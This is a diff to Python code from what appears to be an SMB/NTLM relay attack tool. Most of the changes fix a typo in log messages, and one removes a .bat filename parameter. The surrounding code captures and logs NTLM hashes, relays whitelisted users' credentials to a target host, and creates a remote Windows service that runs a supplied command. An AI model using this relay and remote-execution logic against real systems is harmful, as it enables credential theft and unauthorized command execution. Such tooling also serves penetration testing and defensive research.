@@ -119,7 +119,7 @@ def ParseHTTPHash(data, key, client,UserToRelay,Host):
                 print "[+] Received NTLMv1 hash from: %s %s"%(client, ShowSmallResults((client,445)))
 
                 if User in UserToRelay or "ALL" in UserToRelay:
-                        print "[+] Username: %s is whitelisted, fowarding credentials."%(User)
+                        print "[+] Username: %s is whitelisted, forwarding credentials."%(User)
                         if ReadData("SMBRelay-Session.txt", client, User, HostName, Host[0], cmd=None):
                            ##Domain\User has already auth on this target, but it failed. Ditch the connection to prevent account lockouts.
                            return None, None
@@ -141,7 +141,7 @@ def ParseHTTPHash(data, key, client,UserToRelay,Host):
 		WriteData(Logs_Path+"SMB-Relay-"+client+".txt", WriteHash, User)
                 print "[+] Received NTLMv2 hash from: %s %s"%(client, ShowSmallResults((client,445)))
                 if User in UserToRelay or "ALL" in UserToRelay:
-                        print "[+] Username: %s is whitelisted, fowarding credentials."%(User)
+                        print "[+] Username: %s is whitelisted, forwarding credentials."%(User)
                         if ReadData("SMBRelay-Session.txt", client, User, Domain, Host[0], cmd=None):
                            ##Domain\User has already auth on this target, but it failed. Ditch the connection to prevent account lockouts.
                            return None, None
@@ -173,7 +173,7 @@ def ParseSMBHash(data,client, challenge,UserToRelay,Host):  #Parse SMB NTLMSSP v
 		WriteData(Logs_Path+"SMB-Relay-SMB-"+client+".txt", WriteHash, Username)
                 print "[+] Received NTLMv1 hash from: %s %s"%(client, ShowSmallResults((client,445)))
                 if Username in UserToRelay or "ALL" in UserToRelay:
-                        print "[+] Username: %s is whitelisted, fowarding credentials."%(Username)
+                        print "[+] Username: %s is whitelisted, forwarding credentials."%(Username)
                         if ReadData("SMBRelay-Session.txt", client, Username, Domain, Host[0], cmd=None):
                            ##Domain\User has already auth on this target, but it failed. Ditch the connection to prevent account lockouts.
                            return None, None
@@ -195,7 +195,7 @@ def ParseSMBHash(data,client, challenge,UserToRelay,Host):  #Parse SMB NTLMSSP v
 		WriteData(Logs_Path+"SMB-Relay-SMB-"+client+".txt", WriteHash, Username)
                 print "[+] Received NTLMv2 hash from: %s %s"%(client, ShowSmallResults((client,445)))
                 if Username in UserToRelay or "ALL" in UserToRelay:
-                        print "[+] Username: %s is whitelisted, fowarding credentials."%(Username)
+                        print "[+] Username: %s is whitelisted, forwarding credentials."%(Username)
                         if ReadData("SMBRelay-Session.txt", client, Username, Domain, Host[0], cmd=None):
                            ##Domain\User has already auth on this target, but it failed. Ditch the connection to prevent account lockouts.
                            return None, None
@@ -429,10 +429,8 @@ def CreateService(Command, f, host, data, s):
         ContextHandler = data[84:104]
         ServiceNameChars = ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(11)])
         ServiceIDChars = ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(16)])
-        FileChars = ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(6)])+'.bat'
-        FilePath = FileChars
         head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x09\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
-        w = SMBDCESVCCTLCreateService(ContextHandle=ContextHandler, ServiceName=ServiceNameChars,DisplayNameID=ServiceIDChars, FileName=FilePath,BinCMD=Command)
+        w = SMBDCESVCCTLCreateService(ContextHandle=ContextHandler, ServiceName=ServiceNameChars,DisplayNameID=ServiceIDChars,BinCMD=Command)
         w.calculate()
         x = SMBDCEPacketData(Opnum="\x0c\x00",Data=w)
         x.calculate()
